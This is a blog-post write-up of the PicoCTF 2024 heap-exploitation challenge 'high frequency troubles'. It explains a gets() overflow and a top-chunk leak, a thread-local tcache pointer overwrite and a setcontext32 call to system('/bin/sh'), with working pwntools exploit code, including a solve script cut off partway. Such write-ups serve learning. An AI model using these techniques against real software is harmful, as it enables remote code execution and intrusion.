<!doctype html>
<html lang="en">
    <head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta content='text/html; charset=utf-8' http-equiv='content-type' />


<meta name="title" content="Ethan's Blog" />
<meta name="description" content="My personal blog, where I will post things that I find interesting." />


<meta property="og:type" content="website" />
<meta property="og:title" content="Ethan's Blog" />
<meta property="og:description" content="My personal blog, where I will post things that I find interesting." />


<meta property="twitter:card" content="summary_large_image" />
<meta property="twitter:title" content="Ethan's Blog" />
<meta property="twitter:description" content="My personal blog, where I will post things that I find interesting." />


<link rel="alternate" type="application/rss+xml" title="RSS Feed for Ethan Ho" href="/index.xml" />

<meta name="generator" content="Hugo 0.92.2" />

<link href="https://fonts.googleapis.com/css?family=Montserrat:400,700|Open+Sans:400,700&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Bitter&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">


<link href="https://eth007.me/blog/css/styles.css" rel="stylesheet">

<title>Ethan Ho</title>



<meta name="description" content="A few weeks ago, I played PicoCTF 2024 with a few friends. We were the first team to solve all the challenges, getting us first place on the high school scoreboard and first place overall. high frequency troubles by pepsipu was the least-solved challenge in the competition, with 31 solves at the end of the competition. I worked on this challenge with my teammate stuckin414141, and we were able to solve it with a pretty cool (although slightly unintended) solution.">
<meta name="author" content="">


<meta property="og:type" content="website">
<meta property="og:title" content="PicoCTF 2024 - high frequency troubles" />
<meta property="og:description" content="A few weeks ago, I played PicoCTF 2024 with a few friends. We were the first team to solve all the challenges, getting us first place on the high school scoreboard and first place overall. high frequency troubles by pepsipu was the least-solved challenge in the competition, with 31 solves at the end of the competition. I worked on this challenge with my teammate stuckin414141, and we were able to solve it with a pretty cool (although slightly unintended) solution." />
<meta property="og:url" content="https://eth007.me/blog/posts/high-frequency-troubles/" />
<meta property="og:image" content="https://eth007.me/blog/static/open-graph.png">
<meta property="og:author" content="">


<meta name="twitter:card" content="summary_large_image">
<meta property="twitter:domain" content="https://eth007.me/blog/">
<meta property="twitter:url" content="https://eth007.me/blog/posts/high-frequency-troubles/">
<meta name="twitter:title" content="PicoCTF 2024 - high frequency troubles">
<meta name="twitter:description" content="A few weeks ago, I played PicoCTF 2024 with a few friends. We were the first team to solve all the challenges, getting us first place on the high school scoreboard and first place overall. high frequency troubles by pepsipu was the least-solved challenge in the competition, with 31 solves at the end of the competition. I worked on this challenge with my teammate stuckin414141, and we were able to solve it with a pretty cool (although slightly unintended) solution.">
<meta name="twitter:image" content="https://eth007.me/blog/static/open-graph.png">

<link rel="icon" type="image/x-icon" href="https://eth007.me/blog/img/logo.png">

</head>
    <body>
        <div class="content">
            <nav class="blog-navigation">

  <div class="left">
    
      <div class="blog-logo">
        
        

        <a href='/blog/' title="Ethan Ho">
          <img src="https://eth007.me/blog/img/logo.png" alt="Ethan Ho">
        </a>

      </div>
    
      <div class="blog-info">
          <div class="blog-title">
            <a href='/blog/' title="Ethan Ho">
              <h1>Ethan Ho</h1>
            </a>
          </div>
    
          <div class="blog-description">
            <a href='/blog/' title="Ethan Ho">
              <h2></h2>
            </a>
          </div>
      </div>

  </div>

  <div class="right">

    <div class="blog-links">

      <ul class="links">

        

          <li class="item page"><a href='/blog/' title="home">home</a></li><li class="item page"><a href='/blog/cypat' title="projects">projects</a></li><li class="item page"><a href='https://github.com/Eth007' title="github">github</a></li><li class="item page"><a href='https://eth007.me/resume.pdf' title="resume">resume</a></li>

        
        
        

      </ul>

    </div>

  </div>


</nav>
            

<div class="single">

    <article>

        <div class="article-meta">
        
    <ul class="article-info">
        <li class="time" style="">
            <time class="time">28 Mar 2024</time>
        </li>
        <li class="reading-time" style="">
            <span class="material-icons">timer</span>10 min read
        </li>
        <li class="words-count" style="">
            <span class="material-icons">article</span>2022 words
        </li>
    </ul>

    <ul class="article-tags" style="">

        
            
             

    </ul>

</div>
                      
        <div class="article-header">
            <h1 class="article-title">PicoCTF 2024 - high frequency troubles</h1>          
            <h2 class="article-excerpt">mmaped memory manufactures meticulous menaces</h2>  
        </div>

        <div class="article-content">
            <p>A few weeks ago, I played PicoCTF 2024 with a few friends. We were the first team to solve all the challenges, getting us first place on the high school scoreboard and first place overall. <code>high frequency troubles</code> by <a href="https://pepsipu.com/">pepsipu</a> was the least-solved challenge in the competition, with 31 solves at the end of the competition. I worked on this challenge with my teammate stuckin414141, and we were able to solve it with a pretty cool (although slightly unintended) solution.</p>
<p>We are given a <a href="https://artifacts.picoctf.net/c_tethys/8/hft">binary</a>, the <a href="https://artifacts.picoctf.net/c_tethys/8/main.c">source code</a>, and the <a href="https://artifacts.picoctf.net/c_tethys/8/libc.so.6">libc</a> that goes with this program.</p>
<h2 id="the-challenge">The challenge</h2>
<p>Looking at the source code, we find a pretty simple program:</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#78787e">#include</span> <span style="color:#78787e">&lt;stdio.h&gt;</span><span style="color:#78787e">
</span><span style="color:#78787e">#include</span> <span style="color:#78787e">&lt;stdlib.h&gt;</span><span style="color:#78787e">
</span><span style="color:#78787e">#include</span> <span style="color:#78787e">&lt;stdint.h&gt;</span><span style="color:#78787e">
</span><span style="color:#78787e"></span>
<span style="color:#ff6ac1">enum</span>
{
    PKT_OPT_PING,
    PKT_OPT_ECHO,
    PKT_OPT_TRADE,
} <span style="color:#ff6ac1">typedef</span> pkt_opt_t;

<span style="color:#ff6ac1">enum</span>
{
    PKT_MSG_INFO,
    PKT_MSG_DATA,
} <span style="color:#ff6ac1">typedef</span> pkt_msg_t;

<span style="color:#ff6ac1">struct</span>
{
    size_t sz;
    <span style="color:#9aedfe">uint64_t</span> data[];
} <span style="color:#ff6ac1">typedef</span> pkt_t;

<span style="color:#ff6ac1">const</span> <span style="color:#ff6ac1">struct</span>
{
    <span style="color:#9aedfe">char</span> <span style="color:#ff6ac1">*</span>header;
    <span style="color:#9aedfe">char</span> <span style="color:#ff6ac1">*</span>color;
} type_tbl[] <span style="color:#ff6ac1">=</span> {
    [PKT_MSG_INFO] <span style="color:#ff6ac1">=</span> {<span style="color:#5af78e">&#34;PKT_INFO&#34;</span>, <span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\x1b</span><span style="color:#5af78e">[1;34m&#34;</span>},
    [PKT_MSG_DATA] <span style="color:#ff6ac1">=</span> {<span style="color:#5af78e">&#34;PKT_DATA&#34;</span>, <span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\x1b</span><span style="color:#5af78e">[1;33m&#34;</span>},
};

<span style="color:#9aedfe">void</span> <span style="color:#57c7ff">putl</span>(pkt_msg_t type, <span style="color:#9aedfe">char</span> <span style="color:#ff6ac1">*</span>msg)
{
    printf(<span style="color:#5af78e">&#34;%s%s</span><span style="color:#5af78e">\x1b</span><span style="color:#5af78e">[m:[%s]</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">&#34;</span>, type_tbl[type].color, type_tbl[type].header, msg);
}

<span style="color:#78787e">// gcc main.c -o hft -g
</span><span style="color:#78787e"></span><span style="color:#9aedfe">int</span> <span style="color:#57c7ff">main</span>()
{
    setbuf(stdout, <span style="color:#ff5c57">NULL</span>);
    setbuf(stdin, <span style="color:#ff5c57">NULL</span>);

    putl(PKT_MSG_INFO, <span style="color:#5af78e">&#34;BOOT_SQ&#34;</span>);

    <span style="color:#ff6ac1">for</span> (;;)
    {
        putl(PKT_MSG_INFO, <span style="color:#5af78e">&#34;PKT_RES&#34;</span>);

        size_t sz <span style="color:#ff6ac1">=</span> <span style="color:#ff9f43">0</span>;
        fread(<span style="color:#ff6ac1">&amp;</span>sz, <span style="color:#ff6ac1">sizeof</span>(size_t), <span style="color:#ff9f43">1</span>, stdin);

        pkt_t <span style="color:#ff6ac1">*</span>pkt <span style="color:#ff6ac1">=</span> malloc(sz);
        pkt<span style="color:#ff6ac1">-&gt;</span>sz <span style="color:#ff6ac1">=</span> sz;
        gets(<span style="color:#ff6ac1">&amp;</span>pkt<span style="color:#ff6ac1">-&gt;</span>data);

        <span style="color:#ff6ac1">switch</span> (pkt<span style="color:#ff6ac1">-&gt;</span>data[<span style="color:#ff9f43">0</span>])
        {
        <span style="color:#ff6ac1">case</span> <span style="color:#ff5c57">PKT_OPT_PING</span>:
            putl(PKT_MSG_DATA, <span style="color:#5af78e">&#34;PONG_OK&#34;</span>);
            <span style="color:#ff6ac1">break</span>;
        <span style="color:#ff6ac1">case</span> <span style="color:#ff5c57">PKT_OPT_ECHO</span>:
            putl(PKT_MSG_DATA, (<span style="color:#9aedfe">char</span> <span style="color:#ff6ac1">*</span>)<span style="color:#ff6ac1">&amp;</span>pkt<span style="color:#ff6ac1">-&gt;</span>data[<span style="color:#ff9f43">1</span>]);
            <span style="color:#ff6ac1">break</span>;
        <span style="color:#ff6ac1">default</span><span style="color:#ff6ac1">:</span>
            putl(PKT_MSG_INFO, <span style="color:#5af78e">&#34;E_INVAL&#34;</span>);
            <span style="color:#ff6ac1">break</span>;
        }
    }

    putl(PKT_MSG_INFO, <span style="color:#5af78e">&#34;BOOT_EQ&#34;</span>);
}
</code></pre></div><p>There isn&rsquo;t <em>too</em> much functionality going on, but it isn&rsquo;t minimal either (like some <a href="https://blog.pepsipu.com/posts/nightmare">other challenges</a> by the same author).</p>
<p>Putting aside the weird messages and constant names, this looks like a pretty standard heap menu challengeâ€”we can allocate a chunk using <code>malloc()</code> through using any option, and print data from a chunk using the <code>PKT_OPT_ECHO</code> option. We can control the size of allocations, and we send options in the following format:</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">| 00 00 00 00 | 00 00 00 00 00 00 00 00 | 00 00 00 00 ... 
|    size     |         option          |   any data  ...
</code></pre></div><p>One thing we notice is <em>not</em> present is any kind of call to <code>free()</code>. Usually, we get a lot of attack surface when we can free chunks, but in this program <code>free()</code> is never called at all.</p>
<p>However, to make up for this we have a pretty easy vulnerability; the call to <code>gets()</code> in <code>main</code> allows us to overflow as much data as we want onto the heap. This opens up all sorts of doors for us, as we&rsquo;ll see in a bit.</p>
<p>Looking at the binary and libc, we see that we are working with almost full protections, and are using GLIBC 2.35. For this challenge, this isn&rsquo;t too relevant.</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># checksec hft
[*] &#39;/mnt/c/users/matda/downloads/hft/hft&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b&#39;.&#39;
# ./libc.so.6
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.3) stable release version 2.35.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.3.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
</code></pre></div><p>We also make a helper function to help us to allocate easily:</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">send_echo</span>(content, sz, end<span style="color:#ff6ac1">=</span><span style="color:#ff6ac1">True</span>) :
    sock<span style="color:#ff6ac1">.</span>recvuntil(<span style="color:#5af78e">&#34;PKT_RES&#34;</span>)
    sock<span style="color:#ff6ac1">.</span>send(p32(sz))
    <span style="color:#ff6ac1">if</span> <span style="color:#ff5c57">len</span>(content) <span style="color:#ff6ac1">!=</span> <span style="color:#ff9f43">0</span>:
      payload <span style="color:#ff6ac1">=</span> p32(<span style="color:#ff9f43">0</span>) <span style="color:#ff6ac1">+</span> p64(<span style="color:#ff9f43">1</span>) <span style="color:#ff6ac1">+</span> content
    <span style="color:#ff6ac1">else</span>:
      payload <span style="color:#ff6ac1">=</span> p32(<span style="color:#ff9f43">0</span>) <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">b</span><span style="color:#5af78e">&#39;</span><span style="color:#5af78e">\x01\0\0\0\0\0</span><span style="color:#5af78e">&#39;</span>
    sock<span style="color:#ff6ac1">.</span>sendline(payload)
</code></pre></div><h2 id="exploitation">Exploitation</h2>
<h3 id="step-1---infoleak">Step 1 - Infoleak</h3>
<p>Our first goal is to get a leak. However, this isn&rsquo;t really possible at the moment, because our functions only allow us to interact with the heap, and there is practically no data at all on the heap. We can allocate new chunks on the heap, and we can overflow past their ends, but without using <code>free()</code>, there isn&rsquo;t a way to get any kind of pointer onto the heap for us to leak.</p>
<p>But this isn&rsquo;t a new predicament; there&rsquo;s actually a situation in which we can cause <code>__int_free</code> to be called! This is used in the first step of the classic House of Orange, and was shown in the challenge from SECCON Beginners CTF 2021, <a href="https://web.archive.org/web/20210613164247/https://dystopia.sg/seccon-beginners-2021-freeless/">freeless</a>.</p>
<p>This trick works when we can overwrite the size of the top chunk. In the <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L2665">GLIBC source code</a>, we see that the top chunk will be freed (and put in the unsorted bin) when an allocation is made that is too big for the top chunk to service, but smaller than <code>mp_.mmap_threshold</code>. This will cause the heap to be expanded using <code>sbrk</code>, and the remainder of the top chunk to be freed.</p>
<p>We get this to happen by overwriting the size of the top chunk to a smaller size (while keeping the last three nibbles the same to pass the page alignment check). This causes the top chunk to be freed after the next allocation!</p>
<p>We implement this using our helper function:</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">send_echo(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;&#34;</span>, <span style="color:#ff9f43">0x10</span>)
send_echo(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;a&#34;</span><span style="color:#ff6ac1">*</span><span style="color:#ff9f43">8</span> <span style="color:#ff6ac1">+</span> p64(<span style="color:#ff9f43">0xd31</span>), <span style="color:#ff9f43">0x10</span>) <span style="color:#78787e"># overflow the top chunk size</span>
send_echo(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;b&#34;</span><span style="color:#ff6ac1">*</span><span style="color:#ff9f43">0xf00</span>, <span style="color:#ff9f43">0x1000</span>) <span style="color:#78787e"># allocate a big chunk to cause the free</span>
send_echo(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;&#34;</span>, <span style="color:#ff9f43">0x8</span>) <span style="color:#78787e"># get the leak!</span>
conn<span style="color:#ff6ac1">.</span>recvuntil(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;:[&#34;</span>)
leak <span style="color:#ff6ac1">=</span> u64(conn<span style="color:#ff6ac1">.</span>recv(<span style="color:#ff9f43">6</span>) <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\0\0</span><span style="color:#5af78e">&#34;</span>)
info(<span style="color:#5af78e">&#34;heap leak: &#34;</span> <span style="color:#ff6ac1">+</span> <span style="color:#ff5c57">hex</span>(leak))
</code></pre></div><p>This allocation triggers some heap mechanisms, adding a chunk to the unsorted bin. This happens to place a heap pointer in the third QWORD of our chunk, which is the part that we can leak!</p>
<p>So, we have a leak of the heap. Now what?</p>
<h3 id="step-2---mmap">Step 2 - mmap?</h3>
<p>At this point we got pretty stuck; there wasn&rsquo;t much we could do with the heap at this point. Our frees would only lead to chunks that are in the unsorted bin, and the unsorted bin attack has been patched since GLIBC 2.31.</p>
<p>However, we can take a look at the hint in the description of the challenge:</p>
<blockquote>
<p>allocate a size greater than mp_.mmap_threshold</p>
</blockquote>
<p>At first, the idea of mmap chunks doesn&rsquo;t seem very useful. The only attack I knew of was the <a href="https://maxwelldulin.com/BlogPost/House-of-Muney-Heap-Exploitation">House of Muney</a>, which requires a heap underflow (which we could theoretically get by allocating two adjacent mmap chunks and overflowing into the second one) and the ability to free a mmap chunk (which we definitely don&rsquo;t have).</p>
<p>Experimenting around though, we can find a different area of memory to attack. I initially found this by just overflowing my mmap chunk and seeing where the program segfaulted. It turns out, right above our mmap chunk and right below libc, is <a href="https://gcc.gnu.org/onlinedocs/gcc/Thread-Local.html">thread-local storage</a>!</p>
<p>There are a lot of interesting things stored in thead-local storage; one of them is the canary value for stack smashing protection. But the thing that we&rsquo;re interested in here is the pointer to <code>tcache_perthread_struct</code>.</p>
<p>As the name suggests, <code>tcache_perthread_struct</code> is local to each thread (meaning that its location is stored in thread-local storage), and it contains the freelists for the tcache (which, even in the latest versions of GLIBC, is relatively lax on security checks!). Because we can overwrite thread-local storage, we can change where tcache_perthread_struct is located in memory!</p>
<p>We can overwrite the pointer to a value that is later on the heap than it is already (usually, <code>tcache_perthread_struct</code> is at the very beginning of the heap). Then, we essentially control the freelist, allowing us to allocate chunks at arbitrary (sixteen byte aligned) addresses! Our first objective is to get a libc leak; we can allocate a chunk that is over the libc pointers put onto the stack by the unsorted bin chunk that we allocated earlier. We fill the other freelists with addresses that allow us to re-overwrite <code>tcache_perthread_struct</code> again later for future overwrites.</p>
<p>We do this in our script:</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;a&#34;</span><span style="color:#ff6ac1">*</span>(<span style="color:#ff9f43">8</span><span style="color:#ff6ac1">*</span><span style="color:#ff9f43">6</span>) <span style="color:#78787e"># counts in tcache_perthread_struct (not really relevant, just not 0)</span>
payload <span style="color:#ff6ac1">+=</span> p64(leak<span style="color:#ff6ac1">-</span><span style="color:#ff9f43">8</span><span style="color:#ff6ac1">*</span><span style="color:#ff9f43">4</span><span style="color:#ff6ac1">+</span><span style="color:#ff9f43">0x30</span><span style="color:#ff6ac1">+</span><span style="color:#ff9f43">0xa0</span>) <span style="color:#78787e"># 0x20 bin (location of libc address)</span>
payload <span style="color:#ff6ac1">+=</span> p64(leak<span style="color:#ff6ac1">+</span><span style="color:#ff9f43">0x30</span>) <span style="color:#78787e"># 0x30 bin</span>
payload <span style="color:#ff6ac1">+=</span> p64(leak<span style="color:#ff6ac1">+</span><span style="color:#ff9f43">0x30</span>) <span style="color:#78787e"># 0x40 bin</span>
payload <span style="color:#ff6ac1">+=</span> p64(leak<span style="color:#ff6ac1">+</span><span style="color:#ff9f43">0x30</span>) <span style="color:#78787e"># 0x50 bin</span>
payload <span style="color:#ff6ac1">+=</span> p64(leak<span style="color:#ff6ac1">+</span><span style="color:#ff9f43">0x30</span>) <span style="color:#78787e"># 0x60 bin</span>
payload <span style="color:#ff6ac1">+=</span> p64(leak<span style="color:#ff6ac1">+</span><span style="color:#ff9f43">0x30</span>) <span style="color:#78787e"># 0x70 bin</span>
send_echo(payload, <span style="color:#ff9f43">0x80</span>) <span style="color:#78787e"># new tcache perthread struct</span>

send_echo(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;a</span><span style="color:#5af78e">\0</span><span style="color:#5af78e">a&#34;</span> <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;a&#34;</span><span style="color:#ff6ac1">*</span>(<span style="color:#ff9f43">0x10000</span><span style="color:#ff6ac1">-</span><span style="color:#ff9f43">3</span>)<span style="color:#ff6ac1">+</span><span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;b&#34;</span><span style="color:#ff6ac1">*</span>(<span style="color:#ff9f43">136920</span>) <span style="color:#ff6ac1">+</span> p64(leak<span style="color:#ff6ac1">-</span><span style="color:#ff9f43">0x10</span>), <span style="color:#ff9f43">0x30001</span>) <span style="color:#78787e"># overwrite tls pointer to tcache_perthread_struct</span>

send_echo(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;&#34;</span>, <span style="color:#ff9f43">0x10</span>) <span style="color:#78787e"># allocate over libc address</span>
conn<span style="color:#ff6ac1">.</span>recvuntil(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;:[&#34;</span>)
libcleak <span style="color:#ff6ac1">=</span> u64(conn<span style="color:#ff6ac1">.</span>recv(<span style="color:#ff9f43">6</span>) <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\0\0</span><span style="color:#5af78e">&#34;</span>)
libc<span style="color:#ff6ac1">.</span>address <span style="color:#ff6ac1">=</span> libcleak <span style="color:#ff6ac1">-</span> <span style="color:#ff9f43">0x21a280</span> <span style="color:#ff6ac1">-</span> <span style="color:#ff9f43">0x60</span>
info(<span style="color:#5af78e">&#34;libc @ &#34;</span> <span style="color:#ff6ac1">+</span> <span style="color:#ff5c57">hex</span>(libc<span style="color:#ff6ac1">.</span>address))
</code></pre></div><p>With our libc leak obtained, we can now try to get a shell. This should be simple&hellip; but in GLIBC 2.35, <code>__free_hook</code> and <code>__malloc_hook</code> are gone. How do we utilize our arbitrary write to get a shell?</p>
<h3 id="step-3---just-get-a-shell-already">Step 3 - just get a shell already</h3>
<p>There are actually a lot of ways we could have done this. I tried overwriting libc GOT entries with one_gadgets, but none of them seemed to work. Overwriting atexit handlers or the stack would also work, but they would need extra leaks which I was too lazy to get.</p>
<p>Ultimately, I realized something that the challenge author told me about when we were chilling in DC together last month&hellip; the <code>setcontext32</code> gadget. This allows for calling a function with all registers controlled, just from controlling the beginning of the writable section of libc. Looking it up to refresh my memory, I found that he had even written a <a href="https://hackmd.io/@pepsipu/SyqPbk94a">blog post</a> about it!</p>
<p>Now, all there was left to do was use the function provided in the post, and adjust my helper function to allow me to control the beginning of the chunk:</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">dest, pl <span style="color:#ff6ac1">=</span> setcontext32(
        libc, rip<span style="color:#ff6ac1">=</span>libc<span style="color:#ff6ac1">.</span>sym[<span style="color:#5af78e">&#34;system&#34;</span>], rdi<span style="color:#ff6ac1">=</span>libc<span style="color:#ff6ac1">.</span>search(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;/bin/sh&#34;</span>)<span style="color:#ff6ac1">.</span>__next__()
    )

<span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">send_raw</span>(content, sz, end<span style="color:#ff6ac1">=</span><span style="color:#ff6ac1">True</span>) :
    sock<span style="color:#ff6ac1">.</span>recvuntil(<span style="color:#5af78e">&#34;PKT_RES&#34;</span>)
    sock<span style="color:#ff6ac1">.</span>send(p64(sz))
    payload <span style="color:#ff6ac1">=</span> content
    sock<span style="color:#ff6ac1">.</span>sendline(payload)

payload <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;a&#34;</span><span style="color:#ff6ac1">*</span>(<span style="color:#ff9f43">8</span><span style="color:#ff6ac1">*</span><span style="color:#ff9f43">6</span>)
payload <span style="color:#ff6ac1">+=</span> p64(dest)
payload <span style="color:#ff6ac1">+=</span> p64(<span style="color:#ff9f43">0</span>)
payload <span style="color:#ff6ac1">+=</span> p64(<span style="color:#ff9f43">0</span>)
payload <span style="color:#ff6ac1">+=</span> p64(<span style="color:#ff9f43">0</span>)
payload <span style="color:#ff6ac1">+=</span> p64(<span style="color:#ff9f43">0</span>)
send_echo(payload, <span style="color:#ff9f43">0x50</span>) <span style="color:#78787e"># new tcache_perthread_struct</span>

send_raw(pl[<span style="color:#ff9f43">8</span>:], <span style="color:#ff9f43">0</span>) <span style="color:#78787e"># we want first qword to be 0 because payload is cut off, this convenitently sets the right bytes by setting size to 0</span>

conn<span style="color:#ff6ac1">.</span>interactive()
</code></pre></div><p>With this, we get a shell, and we can get the flag: <code>picoCTF{mm4p_mm4573r_de3d190b}</code></p>
<p>Thanks to <a href="https://pepsipu.com/">pepsipu</a> for a really cool challenge!</p>
<p>Solve script:</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#78787e">#!/usr/bin/env python3</span>

<span style="color:#ff6ac1">from</span> pwn <span style="color:#ff6ac1">import</span> <span style="color:#ff6ac1">*</span>

context<span style="color:#ff6ac1">.</span>binary <span style="color:#ff6ac1">=</span> elf <span style="color:#ff6ac1">=</span> ELF(<span style="color:#5af78e">&#34;./hft_patched&#34;</span>)
libc <span style="color:#ff6ac1">=</span> ELF(<span style="color:#5af78e">&#34;./libc.so.6&#34;</span>)
ld <span style="color:#ff6ac1">=</span> ELF(<span style="color:#5af78e">&#34;./ld-2.35.so&#34;</span>)

<span style="color:#78787e">#sock = conn = process()</span>
sock <span style="color:#ff6ac1">=</span> conn <span style="color:#ff6ac1">=</span> remote(<span style="color:#5af78e">&#34;tethys.picoctf.net&#34;</span>, <span style="color:#ff9f43">57462</span>)

<span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">send_ping</span>(content, sz):
    sock<span style="color:#ff6ac1">.</span>recvuntil(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;PKT_RES&#34;</span>)
    sock<span style="color:#ff6ac1">.</span>send(p32(sz))
    sock<span style="color:#ff6ac1">.</span>sendline(p32(<span style="color:#ff9f43">0</span>) <span style="color:#ff6ac1">+</span> p64(<span style="color:#ff9f43">0</span>) <span style="color:#ff6ac1">+</span> content)

<span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">send_echo</span>(content, sz, end<span style="color:#ff6ac1">=</span><span style="color:#ff6ac1">True</span>) :
    sock<span style="color:#ff6ac1">.</span>recvuntil(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;PKT_RES&#34;</span>)
    sock<span style="color:#ff6ac1">.</span>send(p32(sz))
    <span style="color:#ff6ac1">if</span> <span style="color:#ff5c57">len</span>(content) <span style="color:#ff6ac1">!=</span> <span style="color:#ff9f43">0</span>:
      payload <span style="color:#ff6ac1">=</span> p32(<span style="color:#ff9f43">0</span>) <span style="color:#ff6ac1">+</span> p64(<span style="color:#ff9f43">1</span>) <span style="color:#ff6ac1">+</span> content
    <span style="color:#ff6ac1">else</span>:
      payload <span style="color:#ff6ac1">=</span> p32(<span style="color:#ff9f43">0</span>) <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">b</span><span style="color:#5af78e">&#39;</span><span style="color:#5af78e">\x01\0\0\0\0\0</span><span style="color:#5af78e">&#39;</span>
    sock<span style="color:#ff6ac1">.</span>sendline(payload)

send_echo(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;&#34;</span>, <span style="color:#ff9f43">0x10</span>)
send_echo(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;a&#34;</span><span style="color:#ff6ac1">*</span><span style="color:#ff9f43">8</span> <span style="color:#ff6ac1">+</span> p64(<span style="color:#ff9f43">0xd31</span>), <span style="color:#ff9f43">0x10</span>)
send_echo(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;b&#34;</span><span style="color:#ff6ac1">*</span><span style="color:#ff9f43">0xf00</span>, <span style="color:#ff9f43">0x1000</span>)
send_echo(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;&#34;</span>, <span style="color:#ff9f43">0x8</span>)
conn<span style="color:#ff6ac1">.</span>recvuntil(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;:[&#34;</span>)
leak <span style="color:#ff6ac1">=</span> u64(conn<span style="color:#ff6ac1">.</span>recv(<span style="color:#ff9f43">6</span>) <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\0\0</span><span style="color:#5af78e">&#34;</span>)
info(<span style="color:#5af78e">&#34;heap leak: &#34;</span> <span style="color:#ff6ac1">+</span> <span style="color:#ff5c57">hex</span>(leak))

payload <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;a&#34;</span><span style="color:#ff6ac1">*</span>(<span style="color:#ff9f43">8</span><span style="color:#ff6ac1">*</span><span style="color:#ff9f43">6</span>) <span style="color:#78787e"># counts in tcache_perthread_struct (not really relevant, just not 0)</span>
payload <span style="color:#ff6ac1">+=</span> p64(leak<span style="color:#ff6ac1">-</span><span style="color:#ff9f43">8</span><span style="color:#ff6ac1">*</span><span style="color:#ff9f43">4</span><span style="color:#ff6ac1">+</span><span style="color:#ff9f43">0x30</span><span style="color:#ff6ac1">+</span><span style="color:#ff9f43">0xa0</span>) <span style="color:#78787e"># 0x20 bin (location of libc address)</span>
payload <span style="color:#ff6ac1">+=</span> p64(leak<span style="color:#ff6ac1">+</span><span style="color:#ff9f43">0x30</span>) <span style="color:#78787e"># 0x30 bin</span>
payload <span style="color:#ff6ac1">+=</span> p64(leak<span style="color:#ff6ac1">+</span><span style="color:#ff9f43">0x30</span>) <span style="color:#78787e"># 0x40 bin</span>
payload <span style="color:#ff6ac1">+=</span> p64(leak<span style="color:#ff6ac1">+</span><span style="color:#ff9f43">0x30</span>) <span style="color:#78787e"># 0x50 bin</span>
payload <span style="color:#ff6ac1">+=</span> p64(leak<span style="color:#ff6ac1">+</span><span style="color:#ff9f43">0x30</span>) <span style="color:#78787e"># 0x60 bin</span>
